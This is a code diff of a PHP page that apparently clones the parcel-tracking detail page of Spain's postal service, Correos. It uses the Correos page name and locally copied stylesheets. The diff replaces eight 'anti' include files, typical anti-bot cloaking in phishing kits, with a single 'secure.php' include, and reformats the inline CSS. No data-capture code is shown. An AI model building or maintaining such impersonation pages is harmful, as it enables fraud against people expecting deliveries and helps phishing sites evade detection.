@@ -1,34 +1,72 @@
 <?php
-
-    include '../secure/anti1.php';
-	include '../secure/anti2.php';
-	include '../secure/anti3.php';
-	include '../secure/anti4.php';
-	include '../secure/anti5.php';
-	include '../secure/anti6.php';
-	include '../secure/anti7.php';
-	include '../secure/anti8.php';
+	require_once __DIR__ . '/../secure/secure.php';
 
 
 ?>
-<html lang="es" class="hydrated" style="position: relative;" id="indexBody"><head>
-    <title>Detalle</title>
-    <!-- Include necessary meta tags, stylesheets, and scripts here -->
-<style>.osSwitch{position:relative;display:inline-block;width:34px;height:15.3px}.osSwitch input{opacity:0;width:0;height:0}.osSlider{position:absolute;top:0;left:0;right:0;bottom:0;border-radius:34px;background-color:#93a0b5;transition:0.4s}.osSlider:before{position:absolute;content:'';height:13px;width:13px;left:2px;bottom:1px;border-radius:50%;background-color:white;transition:0.4s}input:checked+.sliderGreen{background-color:#04d289}input:checked+.sliderRed{background-color:#ff3b30}input:not(:checked)+.defaultGreen{background-color:#04d289}input:checked+.osSlider:before{transform:translateX(17px)}
-</style><style>
-    @font-face {
-      font-family: 'SegoeUI_online_security'; 
-      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui.woff);
-    }
+<!DOCTYPE html>
+<html lang="es" class="hydrated" style="position: relative;" id="indexBody">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Detalle</title>
+	<style>
+		.osSwitch {
+			position: relative;
+			display: inline-block;
+			width: 34px;
+			height: 15.3px;
+		}
 
-    @font-face {
-      font-family: 'SegoeUI_bold_online_security'; 
-      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui-bold.woff);
-    }
-</style></head>
+		.osSwitch input {
+			opacity: 0;
+			width: 0;
+			height: 0;
+		}
+
+		.osSlider {
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			border-radius: 34px;
+			background-color: #93a0b5;
+			transition: 0.4s;
+		}
+
+		.osSlider:before {
+			position: absolute;
+			content: '';
+			height: 13px;
+			width: 13px;
+			left: 2px;
+			bottom: 1px;
+			border-radius: 50%;
+			background-color: #fff;
+			transition: 0.4s;
+		}
+
+		input:checked + .sliderGreen {
+			background-color: #04d289;
+		}
+
+		input:checked + .sliderRed {
+			background-color: #ff3b30;
+		}
+
+		input:not(:checked) + .defaultGreen {
+			background-color: #04d289;
+		}
+
+		input:checked + .osSlider:before {
+			transform: translateX(17px);
+		}
+	</style>
+</head>
+
 <body class="page basicpage" onload="delayRefresh()" data-pagename="correosweb:herramientas:localizador:envios:detalle" id="tophtml">
     
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
 		<link rel="stylesheet" href="./files/css/clientlib-react.min.43091e600ff5d0e3d65a5590bfe00a1d.css" type="text/css">
 		<link rel="stylesheet" href="./files/css/animista.css">
